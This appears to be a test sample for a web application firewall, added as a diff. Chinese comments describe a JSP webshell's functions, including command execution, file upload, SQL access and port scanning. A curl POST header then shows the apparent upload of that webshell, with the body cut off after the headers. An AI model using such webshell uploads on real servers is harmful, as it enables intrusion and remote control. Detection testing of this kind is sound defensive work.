@@ -1,0 +1,22 @@
+# webshell-80000444
+# 这个webshell是一个采用java语言的 JavaServer Pages技术编写的多功能的管理界面，允许用户执行各种操作。主要功能包括：显示主菜单、系统信息、Servlet信息和文件列表。
+# 基本信息：
+# - 文件名：list1.jsp
+# - 文件大小：34KB
+# 行为描述：
+# -上传文件到服务器。
+# -执行文件中的命令。
+# -压缩文件夹。
+# -连接数据库，执行SQL命令。
+# -扫描指定IP范围内的端口。
+# -切换代理服务。
+# -显示用户界面选项。
+# -提供一些系统工具。
+POST /?bid=hd_tag_m8mv25p3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25p3
+RM-PRO-Token: 1005bb1fe5ba5810d3677e94a8314a22
+RM-PRO-Time: 1742808497316
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=CTLBNoYpn0mEH53rT4EY3bbGYZ9tPojC
+
